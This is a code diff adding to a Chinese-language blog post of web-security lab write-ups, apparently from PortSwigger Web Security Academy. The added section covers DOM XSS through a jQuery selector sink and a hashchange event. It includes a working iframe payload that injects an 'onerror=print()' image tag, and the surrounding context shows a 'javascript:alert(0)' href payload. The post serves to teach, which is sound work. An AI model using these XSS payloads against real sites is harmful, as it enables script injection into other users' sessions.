@@ -63,6 +63,32 @@ export default function Post() {
             <X.P>
                 注入点是`a`标签的`href`，`payload`为`javascript:alert(0)`。输入URL`/feedback?returnPath=javascript:alert(0)`，然后点击这个`a`标签。
             </X.P>
+            <X.H2>Ap: DOM XSS in jQuery selector sink using a hashchange event</X.H2>
+            <X.P>注入点：</X.P>
+            <X.CodeBlock
+                language="js"
+                code={`
+                $(window).on('hashchange', function(){
+                    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+                    if (post) post.get(0).scrollIntoView();
+                });
+                `}
+            />
+            <X.P>
+                此题目用到特定版本jQuery的漏洞，`$()`可以被利用向DOM中注入恶意元素。这道题目需要构造一个恶意网页发送给目标用户，所以需要在用户侧触发`hashchange`，因此使用`iframe`。
+            </X.P>
+            <X.P>
+                官方题解直接在`onload`中改变`this.src`，尽管也可以触发`print()`函数，但是这样做会导致循环（`this.src`改变时，再次调用`onload`，然后再改变`this.src`）。所以这里加了判断。
+            </X.P>
+            <X.CodeBlock
+                language="html"
+                code={`
+                <iframe
+                    src="https://0a47005704554525834f7e66009e008f.web-security-academy.net/#"
+                    onload="this.src.endsWith('#') && (this.src+='<img src=0 onerror=print()>')"
+                >
+                `}
+            />
             <X.H1>SSRF: Server-side request forgery</X.H1>
             <X.H2>Ap: Basic SSRF against the local server</X.H2>
             <X.P>根据提示，发送请求：</X.P>
